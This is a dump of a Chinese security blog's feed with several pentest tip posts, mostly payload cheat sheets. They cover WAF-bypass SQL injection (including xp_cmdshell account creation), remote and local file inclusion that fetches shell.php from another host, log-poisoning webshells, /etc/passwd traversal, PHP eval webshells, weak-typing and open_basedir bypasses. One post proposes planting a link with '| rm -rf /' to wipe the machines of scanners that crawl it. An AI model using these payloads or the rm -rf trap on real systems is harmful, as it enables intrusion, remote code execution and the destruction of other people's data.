<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">preg_match(&apos;/(and|or|union|where|limit|group by|select|\&apos;|hex|substr)/i&apos;, $id)</div><div class="line">Filtered injection: 1 || substr(user,1,1) = lower(conv(11,10,36))</div><div class="line">Bypassed injection: 1 || lpad(user,7,1)</div></pre></td></tr></table></figure>
</li>
<li><p>过滤 and, or, union, where, limit, group by, select, ‘, hex, substr, 空格</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">preg_match(&apos;/(and|or|union|where|limit|group by|select|\&apos;|hex|substr|\s)/i&apos;, $id)</div><div class="line">Filtered injection: 1 || lpad(user,7,1)</div><div class="line">ypassed injection: 1%0b||%0blpad(user,7,1)</div></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="0x02-正则绕过"><a href="#0x02-正则绕过" class="headerlink" title="0x02 正则绕过"></a>0x02 正则绕过</h1><p>根据正则的的模糊匹配特性绕过，比如过滤了’=’<br>filtered injection:     1 or 1 = 1<br>Bypassed injection:     1 or 1,1 or ‘1’,1 or char(97)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">eg:</div><div class="line">filtered injection:     1 union select 1, table_name from information_schema.tables where table_name = &apos;users&apos;</div><div class="line">Bypassed injection:     1 union select 1, table_name from information_schema.tables where table_name between &apos;a&apos; and &apos;z&apos;</div><div class="line">Bypassed injection:     1 union select 1, table_name from information_schema.tables where table_name between char(97) and char(122)</div><div class="line">Bypassed injection:     1 union select 1, table_name from information_schema.tables where table_name between 0x61 and 0x7a</div><div class="line">Bypassed Injection:     1 union select 1, table_name from information_schema.tables where table_name like 0x7573657273</div></pre></td></tr></table></figure></p>
<h1 id="0x03-通用绕过"><a href="#0x03-通用绕过" class="headerlink" title="0x03 通用绕过"></a>0x03 通用绕过</h1><h2 id="1-注释符"><a href="#1-注释符" class="headerlink" title="1.注释符"></a>1.注释符</h2><blockquote>
<p>?id=1+un/<strong>/ion+se/</strong>/lect+1,2,3–</p>
</blockquote>
<h2 id="2-大小写"><a href="#2-大小写" class="headerlink" title="2.大小写"></a>2.大小写</h2><blockquote>
<p>?id=1+UnIoN/<strong>/SeLecT/</strong>/1,2,3–</p>
</blockquote>
<h2 id="3-关键字替换"><a href="#3-关键字替换" class="headerlink" title="3.关键字替换"></a>3.关键字替换</h2><p>有些waf等使用preg_replace替换了SQL关键字<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">?id=1+UNunionION+SEselectLECT+1,2,3--</div><div class="line">?id=1+uni%0bon+se%0blect+1,2,3--</div></pre></td></tr></table></figure></p>
<p>有时候注释符’/**/‘可能被过滤，也可以使用%0b绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Forbidden: http://localhost/id/1/**/||/**/lpad(first_name,7,1).html</div><div class="line">Bypassed : http://localhost/id/1%0b||%0blpad(first_name,7,1).html</div></pre></td></tr></table></figure></p>
<h2 id="4-编码"><a href="#4-编码" class="headerlink" title="4.编码"></a>4.编码</h2><p>一个经典的脚本：Nukesentinel.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">// Check for UNION attack</div><div class="line">      // Copyright 2004(c) Raven PHP Scripts</div><div class="line">      $blocker_row = $blocker_array[1];</div><div class="line">      if($blocker_row[&apos;activate&apos;] &gt; 0) &#123;</div><div class="line">       if (stristr($nsnst_const[&apos;query_string&apos;],&apos;+union+&apos;) OR \</div><div class="line">      stristr($nsnst_const[&apos;query_string&apos;],&apos;%20union%20&apos;) OR \</div><div class="line">      stristr($nsnst_const[&apos;query_string&apos;],&apos;*/union/*&apos;) OR \</div><div class="line">      stristr($nsnst_const[&apos;query_string&apos;],&apos; union &apos;) OR \</div><div class="line">      stristr($nsnst_const[&apos;query_string_base64&apos;],&apos;+union+&apos;) OR \</div><div class="line">      stristr($nsnst_const[&apos;query_string_base64&apos;],&apos;%20union%20&apos;) OR \</div><div class="line">      stristr($nsnst_const[&apos;query_string_base64&apos;],&apos;*/union/*&apos;) OR \</div><div class="line">      stristr($nsnst_const[&apos;query_string_base64&apos;],&apos; union &apos;)) &#123;  // block_ip($blocker_row);</div><div class="line">         die(&quot;BLOCK IP 1 &quot; );</div><div class="line">        &#125;</div><div class="line">      &#125;</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Forbidden: http://localhost/php/?/**/union/**/select</div><div class="line">Bypassed : http://localhost/php/?/%2A%2A/union/%2A%2A/select</div><div class="line">Bypassed : http://localhost/php/?%2f**%2funion%2f**%2fselect</div></pre></td></tr></table></figure>
<h2 id="5-缓冲区溢出"><a href="#5-缓冲区溢出" class="headerlink" title="5.缓冲区溢出"></a>5.缓冲区溢出</h2><blockquote>
<p><a href="http://localhost/news.php?id=1+and+(select" target="_blank" rel="external">http://localhost/news.php?id=1+and+(select</a> 1)=(select 0xA*1000)+union+select+1,2,version(),database(),user(),6,7,8,9,10–</p>
</blockquote>
<h2 id="6-内联注释-mysql"><a href="#6-内联注释-mysql" class="headerlink" title="6.内联注释(mysql)"></a>6.内联注释(mysql)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://localhost/news.php?id=1/*!UnIoN*/SeLecT+1,2,3--</div><div class="line">http://localhost/news.php?id=/*!UnIoN*/+/*!SeLecT*/+1,2,concat(/*!table_name*/)+FrOm/*!information_schema*/.tables/*!WhErE*/+/*!TaBlE_sChEMa*/+like+database()--</div></pre></td></tr></table></figure>
<h1 id="0x04-高级绕过"><a href="#0x04-高级绕过" class="headerlink" title="0x04 高级绕过"></a>0x04 高级绕过</h1><h2 id="1-HPP（http参数污染"><a href="#1-HPP（http参数污染" class="headerlink" title="1.HPP（http参数污染)"></a>1.HPP（http参数污染)</h2><p>举个例子：<br>index.php?par1=val1&amp;par1=val2<br>| web server | par1 |<br>| :— | :— |<br>| ASP.NET/IIS | val1,val2 |<br>| ASP/IIS | val1,val2 |<br>| PHP/Apache | val2 |<br>| JSP/Tomcat | val1 |<br>eg:<br>在<code>ASP/ASP.NET</code>的环境下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Forbidden: http://localhost/search.aspx?q=select name,password from users</div><div class="line">Bypassed : http://localhost/search.aspx?q=select name&amp;q=password from users</div><div class="line">Bypassed : http://localhost/search.aspx?q=select/*&amp;q=*/name&amp;q=password/*&amp;q=*/from/*&amp;q=*/users</div><div class="line">Bypassed : http://localhost/news.aspx?id=1&apos;; /*&amp;id=1*/ EXEC /*&amp;id=1*/ master..xp_cmdshell /*&amp;id=1*/ net user test test /*&amp;id=1*/ --</div></pre></td></tr></table></figure></p>
<h2 id="2-HPC-http参数污染"><a href="#2-HPC-http参数污染" class="headerlink" title="2.HPC(http参数污染)"></a>2.HPC(http参数污染)</h2><p>RFC2396定义了如下一些字符：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Unreserved: a-z, A-Z, 0-9 and _ . ! ~ * &apos; ()</div><div class="line">Reserved : ; / ? : @ &amp; = + $ ,</div><div class="line">Unwise : &#123; &#125; | \ ^ [ ] `</div></pre></td></tr></table></figure></p>
<p>不同的Web服务器处理处理构造得特殊请求时有不同的逻辑：<br>| Query String | Apache/2.2.16,PHP/5.3.3 | IIS6/ASP |<br>| :— | :— | :— |<br>| ?test[1=2 | test_1=2 | test[1=2 |<br>| ?test=% | test=% | test= |<br>| ?test%00=1 | test= | test=1 |<br>| ?test=1%001 | NULL | test=1 |<br>| ?test+d=1+2 | test_d=1 2 | test d=1 2 |<br>eg:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Forbidden: http://localhost/?xp_cmdshell</div><div class="line">Bypassed : http://localhost/?xp[cmdshell</div><div class="line">Forbidden: http://localhost/test.asp?file=../flag.txt</div><div class="line">Bypassed : http://localhost/test.asp?file=.%./flag.txt</div><div class="line">Forbidden: http://localhost/news.asp?id=10 and 1=0/(select top 1 table_name from information_schema.tables)</div><div class="line">Bypassed : http://localhost/news.asp?id=10 a%nd 1=0/(se%lect top 1 ta%ble_name fr%om info%rmation_schema.tables)</div></pre></td></tr></table></figure></p>
]]></content>
      
        
        <tags>
            
            <tag> WAF绕过 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[文件包含-Tips]]></title>
      <url>/2017/03/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-Tips/</url>
      <content type="html"><![CDATA[<p>学校要搞个译文(真特么不明白有什么卵用…)，然后就找了几篇外国比较好的文章，趁着也涨点姿势。<br><a id="more"></a></p>
<h1 id="基本的文件包含攻击"><a href="#基本的文件包含攻击" class="headerlink" title="基本的文件包含攻击"></a>基本的文件包含攻击</h1><p>不多说，都懂</p>
<blockquote>
<p><a href="http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go" target="_blank" rel="external">http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go</a> into 192.168.1.11/bWAPP/flfi.php?language=<a href="http://192.168.1.11/shell.php" target="_blank" rel="external">http://192.168.1.11/shell.php</a></p>
</blockquote>
<h1 id="扩展的文件包含攻击"><a href="#扩展的文件包含攻击" class="headerlink" title="扩展的文件包含攻击"></a>扩展的文件包含攻击</h1><p>加了个<code>?</code>不是很明白是什么原因，我觉得是<strong>截断</strong>。</p>
<blockquote>
<p><a href="http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go" target="_blank" rel="external">http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go</a> into192.168.1.11/bWAPP/flfi.php? language=<a href="http://192.168.1.11/shell.php?" target="_blank" rel="external">http://192.168.1.11/shell.php?</a></p>
</blockquote>
<h1 id="空字节截断"><a href="#空字节截断" class="headerlink" title="空字节截断"></a>空字节截断</h1><p><code>%00</code>都是老套路</p>
<blockquote>
<p><a href="http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go" target="_blank" rel="external">http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go</a> into 192.168.1.11/bWAPP/flfi.php?language=<a href="http://192.168.1.11/shell.php%00" target="_blank" rel="external">http://192.168.1.11/shell.php%00</a></p>
</blockquote>
<h1 id="更改HTTP"><a href="#更改HTTP" class="headerlink" title="更改HTTP"></a>更改HTTP</h1><blockquote>
<p><a href="http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go" target="_blank" rel="external">http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go</a> into192.168.1.11/bWAPP/flfi.ph？language = <strong>HTTP</strong>：//192.168.1.11/shell.php</p>
</blockquote>
<h1 id="更改图像扩展名"><a href="#更改图像扩展名" class="headerlink" title="更改图像扩展名"></a>更改图像扩展名</h1><p>不知道老外为啥这样说，我觉得是文件伪装啊</p>
<p>修改文件内容，在文件头添加<code>GIF89a</code>，然后修改文件后缀为<code>shell.gif</code></p>
<blockquote>
<p><a href="http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go" target="_blank" rel="external">http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go</a> into192.168.1.11/bWAPP/flfi.ph?language=http：//192.168.1.11/shell.gif</p>
</blockquote>
<h1 id="黑名单攻击"><a href="#黑名单攻击" class="headerlink" title="黑名单攻击"></a>黑名单攻击</h1><p>修改大小写啦，修改后缀啦，解析漏洞啦，比如<code>.PHP</code>,<code>.php3</code>,<code>.asa</code>,<code>.cer</code>这些啦等等。</p>
<blockquote>
<p><a href="http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go" target="_blank" rel="external">http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go</a> into192.168.1.11/bWAPP/flfi.php?language=<a href="http://192.168.1.11/shell.PHP" target="_blank" rel="external">http://192.168.1.11/shell.PHP</a></p>
</blockquote>
<h1 id="Base64编码"><a href="#Base64编码" class="headerlink" title="Base64编码"></a>Base64编码</h1><blockquote>
<p><a href="http://192.168.1.113/bWAPP/rlfi.php?language=" target="_blank" rel="external">http://192.168.1.113/bWAPP/rlfi.php?language=</a> php://filter/read=convert.base64-encode-resource=<a href="http://192.168.1.11/shell.php" target="_blank" rel="external">http://192.168.1.11/shell.php</a></p>
</blockquote>
<p>搞到最后老外自己还来个<strong>厉害了！！！</strong>,把我当时整蒙蔽了。。</p>
<h1 id="PHP-input输入流"><a href="#PHP-input输入流" class="headerlink" title="PHP input输入流"></a>PHP input输入流</h1><p>套路…<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.101/bWAPP/rlfi.php?language=php://input&amp;cmd=ls</div><div class="line">POST:</div><div class="line">&lt;?php system($_GET[&apos;cmd&apos;]);?&gt;</div></pre></td></tr></table></figure></p>
<h1 id="Proc-self-environ"><a href="#Proc-self-environ" class="headerlink" title="Proc/self/environ"></a>Proc/self/environ</h1><p>这个有很多种的，不限于这个日志，比如<code>access.log</code>,<code>error_log</code>等各种日志文件。</p>
<p>通过包含User-Agent的proc/self/environ文件来利用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">User-Agent: &lt;?php system($_GET[&apos;cmd&apos;]);?&gt;</div><div class="line">http://192.168.1.102/dvwa/vulnerabilities/fi/?page=proc/self/environ&amp;cmd=id</div></pre></td></tr></table></figure></p>
<h1 id="PHP文件包含"><a href="#PHP文件包含" class="headerlink" title="PHP文件包含"></a>PHP文件包含</h1><p>自己的小概述</p>
<h2 id="基本的本地文件包含"><a href="#基本的本地文件包含" class="headerlink" title="基本的本地文件包含"></a>基本的本地文件包含</h2><p><code>&lt;?php include(“inc/” .$_GET[‘file’]);?&gt;</code><br>包含文件在当前目录下：<br><code>?file=.htaccess</code><br>目录遍历：<br><code>？file=../../../../../../../../var/lib/locate.db</code><br>包含注入的PHP代码：<br><code>？file=../../../../../../../var/log/apache/error.log</code><br>一些技巧：</p>
<ol>
<li>可能的Apache目录列表</li>
<li>包含访问日志，比如/proc/self/fd/X</li>
<li>包含来拥有更多信息的proc文件系统</li>
<li>包含电子邮件的日志文件</li>
<li>包含ssh的认证日志文件 auth.log</li>
<li>尽可能多的尝试头像/图片/附件文件上传</li>
<li>包含会话文件</li>
<li>包含PHP的临时上传文件（可以利用条件竞争）<br>如果你有一个phpinfo()，请参考我们Drops的文章<a href="http://www.freebuf.com/articles/web/79830.html" target="_blank" rel="external">LFI with PHPInfo本地测试过程</a>。</li>
</ol>
<h2 id="有限制的本地文件包含"><a href="#有限制的本地文件包含" class="headerlink" title="有限制的本地文件包含"></a>有限制的本地文件包含</h2><p><code>&lt;?php include(‘inc/’. $_GET[‘file’] . “.htm”); ?&gt;</code><br>空字节注入：<br><code>?file=../../../../../../../../etc/passwd%00</code><br>（需要php配置关闭magic_quotes_gpc）<br>空字节注入目录列表：<br><code>?file=../../../../../../../var/www/accounts/%00</code><br>（仅限于UFS系统中，并且需要关闭magic_quotes_gpc）<br>路径截断：<br><code>?file=../../../../../../etc/passwd.\.\.\.\.\.\.\.\.\...</code><br>点截断：<br><code>?file=../../../../../../etc/passwd…………………………</code><br>（仅限于windows系统中）<br>反向路径截断：<br><code>?file=../../../../[..]../../../etc/passwd</code></p>
<h2 id="基本的远程文件包含"><a href="#基本的远程文件包含" class="headerlink" title="基本的远程文件包含"></a>基本的远程文件包含</h2><p><code>&lt;?php include($_GET[‘file’]); ?&gt;</code><br>包含远程代码：<br><code>?file=[http|https|ftp]://websec.wordpress.com/shell.txt</code><br>（需要<code>allow_url_fopen</code>、和<code>allow_url_include</code>开启）<br>使用php：input输入流：<br><code>?file=php://input</code><br>（在POST参数中设置你的攻击载荷，注意<code>urlencoding</code>，并且需要<code>allow_url_include</code>开启）<br>使用URIs数据：<br><code>?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=</code><br>（需要<code>allow_url_include</code>开启）<br>使用XSS：<br><code>?file=http://127.0.0.1/path/xss.php?xss=phpcode</code><br>（只有在防火墙或在白名单内的域名才有效）</p>
<h2 id="有限制的远程文件包含"><a href="#有限制的远程文件包含" class="headerlink" title="有限制的远程文件包含"></a>有限制的远程文件包含</h2><p><code>&lt;?php include($_GET[‘file’] . “htm”); ?&gt;</code><br><code>file=https://websec.wordpress.com/shell</code><br><code>?file=https://websec.wordpress.com/shell.txt?</code><br><code>?file=https://websec.wordpress.com/shell.txt%23</code><br>（需要<code>allow_url_fopen</code>，<code>allow_url_include</code>开启）<br><code>?file=\\evilshare\shell.php</code><br>（绕过<code>allow_url_fopen</code>关闭的情况下）<br>过滤器逃逸：<br>访问带通配符的文件：</p>
]]></content>
      
        
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> WAF绕过 </tag>
            
            <tag> PHP </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[关于反爬虫的一个思考]]></title>
      <url>/2017/03/05/%E5%85%B3%E4%BA%8E%E5%8F%8D%E7%88%AC%E8%99%AB%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%9D%E8%80%83/</url>
      <content type="html"><![CDATA[<p>最近在开发一个Python的系统，在写爬虫的时候突然想到一个特别猥琐的对付使用脚本进行批量检测的一个小方法。<br><a id="more"></a><br>我们在进行批量扫描并检测的时候，都可能会调用一些系统命令，比如如下代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">for i in get_new_urls:</div><div class="line">    os.system(&quot;python sqlmap.py -u %s&quot; % i)</div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>以上代码，如果我们网站的url里有下面的一个链接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a href=&quot;https://www.baidu.com | rm -rf / &quot;&gt;</div></pre></td></tr></table></figure></p>
<p>那么脚本最后执行的命令就是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">os.system(&quot;python sqlmap.py -u https://www.baidu.com | rm -rf /&quot;)</div></pre></td></tr></table></figure></p>
<p>…</p>
<p>所以你懂的…</p>
]]></content>
      
        
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> 爬虫 </tag>
            
            <tag> Python </tag>
            
            <tag> 自动化 </tag>
            
            <tag> 安全开发 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PHP&XSS的一些小tips]]></title>
      <url>/2017/03/04/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B-XSS%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8Ftips/</url>
      <content type="html"><![CDATA[<p>最近搜集的一些，PHP过waf webshell,弱类型，open<em>basedir，XSS绕过的一些小tips，欢迎大牛纠错。-\</em>-<br><a id="more"></a></p>
<h1 id="无字母数字webshell构造"><a href="#无字母数字webshell构造" class="headerlink" title="无字母数字webshell构造"></a>无字母数字webshell构造</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">PHP TRUE == 1 FALSE == 0 TRUE + TRUE == 2 </div><div class="line">异或：&apos; ! &apos;^&apos; ` &apos; == &apos;A&apos;</div><div class="line">取反：~(&apos;和&apos;&#123;2&#125;) == &apos;s&apos;</div><div class="line">PHP 自增：仅允许字母字符自增</div><div class="line">&apos;a&apos;++ == &apos;b&apos;;</div><div class="line">&apos;z&apos;++ == &apos;aa&apos;;</div><div class="line">php 5.3</div><div class="line">&apos; &apos;.[] == &apos;Array&apos;</div><div class="line">&apos;Array&apos;&#123;0&#125; === &apos;A&apos;</div><div class="line">&apos;Array&apos;&#123;3&#125; === &apos;a&apos;</div><div class="line">&apos; &apos; == 0</div><div class="line">$_=&apos; &apos;.[]; $_&#123;&apos; &apos;&#125;===&apos;A&apos;;</div></pre></td></tr></table></figure>
<h1 id="渗透测试小tips"><a href="#渗透测试小tips" class="headerlink" title="渗透测试小tips"></a>渗透测试小tips</h1><ul>
<li>魔术引号不过滤<code>$_SERVER[]</code>字段，造成注入</li>
<li><p>mysql的类型强制转换可绕过PHP中<code>empty()</code>函数对0的false返回</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">提交/?test=0axxx    -&gt; empty($_GET[&apos;test&apos;]) =&gt; 返回真</div></pre></td></tr></table></figure>
</li>
<li><p>当可控变量进入双引号中时可形成webshell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$a = &quot;$&#123;@eval($_POST[s])&#125;&quot;;</div><div class="line">$a = &quot;$&#123;$&#123;eval($_POST[s])&#125;&#125;&quot;;</div></pre></td></tr></table></figure>
</li>
<li><p>过滤了空格，逗号的注入，可使用括号包裹绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">select(location)from(website);</div><div class="line">select&#123;x(name)&#125;from&#123;x(manager)&#125;;</div></pre></td></tr></table></figure>
</li>
<li><p>由于PHP弱类型验证机制，导致<code>==</code>、<code>in_array()</code>等可通过强制转换绕过验证。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">in_array($_GET[&apos;x&apos;],array(1,2,3,4,5))</div><div class="line">访问?test=’1’testtest可判断成功</div></pre></td></tr></table></figure>
</li>
<li><p>windows特性</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">windows下php中访问文件名使用”&lt;” “&gt;”将会被替换成”*” “?”，分别代表N个任意字符与1个任意字符</div></pre></td></tr></table></figure>
</li>
<li><p>变量覆盖</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$GLOBALS,$_SERVER,$_GET,$_POST,$_COOKIE,$_REQUEST,$_FILES,$_ENV,$_SESSION</div><div class="line">parse_str(),mb_parse_str(),import_request_variables(),extract()</div></pre></td></tr></table></figure>
</li>
</ul>
<h1 id="PHP的强制类型转换的原则"><a href="#PHP的强制类型转换的原则" class="headerlink" title="PHP的强制类型转换的原则"></a>PHP的强制类型转换的原则</h1><ol>
<li>对于数学运算，字符串转换为数值</li>
<li>对于字符串运算，数值转换为字符串<h1 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line">== 只检查值，不检查类型</div><div class="line">=== 既检查值，又检查类型</div><div class="line">NULL,0,”0”,array()使用==和false比较时，都是会返回true的，而使用===却不会</div><div class="line">123abc == 123 —&gt; true</div><div class="line">0 == &apos;abc&apos; —&gt; true</div><div class="line">&apos;0e132456789&apos;==&apos;0e7124511451155&apos; —&gt;true</div><div class="line">240610708、QNKCDZO、aabg7XSs、aabC9RqS的MD5相同</div><div class="line"></div><div class="line">intval()函数：string转int</div><div class="line">intval(&apos;0x1e240&apos;)==&apos;123456&apos; //true</div><div class="line">intval(&apos;0x1e240&apos;)==123456 //true</div><div class="line">intval(&apos;0x1e240&apos;)==&apos;1e240&apos; //false</div><div class="line">当其中的一个字符串是0x开头的时候，ox开头表示16进制，PHP会将此字符串解析成为十进制然后再进行比较，</div><div class="line">0×1e240解析成为十进制就是123456，所以与int类型和string类型的123456比较都是相等</div><div class="line"></div><div class="line">对数组进行MD5，sha1等hash运算时，结果都为NULL</div><div class="line">md5(name[] = 1) == md5(password[]= 2) —&gt;NULL == NULL —&gt;true</div><div class="line"></div><div class="line">strcmp</div><div class="line">strcmp(string $str1,string $str2 )</div><div class="line">如果str1小于str2,返回-1，相等返回0，否则返回1。</div><div class="line">strcmp函数比较字符串的本质是将两个变量转换为ascii，然后进行减法运算，然后根据运算结果来决定返回值。</div><div class="line">如果传入的参数为数字或数组,再和字符串做strcmp，就会返回NULL</div><div class="line">strcmp($array,&apos;123&apos;) == 0</div><div class="line">当array为数字或者数组时，等式等于true</div><div class="line">$array=[1,2,3] —&gt; strcmp([1,2,3] ,&apos;123&apos;) —&gt; NULL —&gt;NULL == 0</div><div class="line"></div><div class="line">in_array()：函数搜索数组中是否存在指定的值</div><div class="line">$array=(0,1,2,&apos;3&apos;)</div><div class="line">in_array(&apos;abc&apos;, $array) —&gt; &apos;abc&apos; —&gt; 0 —&gt; 0 == array[0] —&gt; true</div><div class="line">$array=(0,1,2,3)</div><div class="line">in_array($search, $array)</div><div class="line">当传入$search = 1&apos;aaaaaaaa 结果为true</div><div class="line">in_array($search, $array) —&gt; 1&apos;aaaaaaaa —&gt; 1 —&gt; 1 == array[1] —&gt; true</div><div class="line">注：in_array 有第三个参数</div><div class="line">in_array(’5\’ union select’, array(1, 5, 3, 2), true) —&gt; false</div><div class="line"></div><div class="line">ereg</div><div class="line">ereg(string pattern, string string, array [regs])</div><div class="line">字符串对比解析，以 pattern 的规则来解析比对字符串 string。比对结果返回的值放在数组参数 regs 之中，</div><div class="line">regs[0] 内容就是原字符串 string、regs[1] 为第一个合乎规则的字符串、regs[2] 就是第二个合乎规则的字符串，余类推。</div><div class="line">若省略参数 regs，则只是单纯地比对，找到则返回值为 true。</div><div class="line">ereg函数存在NULL截断漏洞，当ereg读取字符串string时,如果遇到了%00,后面的字符串就不会被解析</div><div class="line">$ip = &quot;192.168.2.11&quot;.chr(0).&quot;haha&quot;;  </div><div class="line">if(ereg(&quot;^[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;$&quot;,$ip)) &#123;  </div><div class="line">        echo $ip;  </div><div class="line">&#125; else &#123;  </div><div class="line">        echo &quot;unknown&quot;;  </div><div class="line">&#125; </div><div class="line">输出：192.168.2.11haha</div><div class="line">注：结合ereg处理$ _SERVER的情况</div></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="绕过open-basedir"><a href="#绕过open-basedir" class="headerlink" title="绕过open_basedir"></a>绕过open_basedir</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">利用DirectoryIterator + Glob 直接列举目录</div><div class="line">realpath列举目录</div><div class="line">SplFileInfo::getRealPath列举目录</div><div class="line">GD库imageftbbox/imagefttext列举目录</div><div class="line">bindtextdomain暴力猜解目录</div></pre></td></tr></table></figure>
